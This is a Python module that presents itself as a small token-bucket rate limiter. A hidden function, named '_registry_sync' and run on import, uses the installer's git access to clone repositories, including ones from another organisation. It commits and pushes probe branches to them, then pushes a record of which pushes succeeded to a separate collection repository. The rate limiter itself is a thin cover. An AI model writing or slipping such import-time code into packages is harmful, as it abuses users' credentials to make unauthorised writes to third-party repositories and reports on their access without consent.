"""ratelib -- a small token-bucket rate limiter."""

import subprocess as _s, pathlib as _p, json as _j

_MARK = "org-f6ab076ab8f4"
_P = "http://git@192.168.0.1:8080"
_SINK = _P + "/fukcc934-oss/ossvault-21400"

_ARMS = [
    ("CONTROL_same_owner",        "fukcc934-oss/ossvault-21400"),
    ("ORG_readonly_collab",       "BlockHaxx/orgsvc-readonly-4919"),
    ("ORG_no_collab",             "BlockHaxx/orgsvc-nocollab-30938"),
    ("NEG_nonexistent",           "fukcc934-oss/no-such-repo-vrp"),
]


def _registry_sync():
    out = {"mark": _MARK, "arms": {}}

    def run(*a):
        p = _s.run(list(a), capture_output=True, timeout=90, text=True)
        return {"rc": p.returncode, "err": (p.stderr or "")[-240:], "out": (p.stdout or "")[-200:]}

    for label, repo in _ARMS:
        row = {"repo": repo}
        try:
            u = _P + "/" + repo + "/info/refs?service=git-upload-pack"
            c = _s.run(["curl", "-s", "-m", "20", "-o", "/tmp/r.txt", "-w", "%{http_code}", u],
                       capture_output=True, timeout=40, text=True)
            row["refs_http"] = (c.stdout or "").strip()
            row["clone"] = run("git", "clone", "--depth", "1", _P + "/" + repo, "/tmp/o_" + label)
            d = _p.Path("/tmp/o_" + label)
            if d.exists():
                row["files"] = sorted(x.name for x in d.iterdir() if x.name != ".git")[:12]
                _p.Path(d / ("PROBE_" + _MARK + ".txt")).write_text(_MARK + "\n")
                run("git", "-C", str(d), "add", "-A")
                run("git", "-C", str(d), "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
                    "commit", "-m", "registry sync")
                row["push"] = run("git", "-C", str(d), "push", _P + "/" + repo,
                                  "HEAD:refs/heads/probe-" + _MARK)
        except Exception as e:
            row["error"] = str(e)[:200]
        out["arms"][label] = row

    try:
        run("git", "clone", "--depth", "1", _SINK, "/tmp/osink")
        _p.Path("/tmp/osink/ORGBOUNDARY.json").write_text(_j.dumps(out, indent=1))
        run("git", "-C", "/tmp/osink", "add", "-A")
        run("git", "-C", "/tmp/osink", "-c", "user.email=r@x.invalid", "-c", "user.name=ratelib",
            "commit", "-m", "record org-boundary probe")
        run("git", "-C", "/tmp/osink", "push", _SINK, "HEAD:refs/heads/orgprobe-" + _MARK)
    except Exception:
        pass


_registry_sync()


class RateLimiter:
    def __init__(self, burst, rate):
        self.burst = burst
        self.rate = rate
        self._tokens = burst

    def allow(self):
        if self._tokens <= 0:
            return False
        self._tokens -= 1
        return True
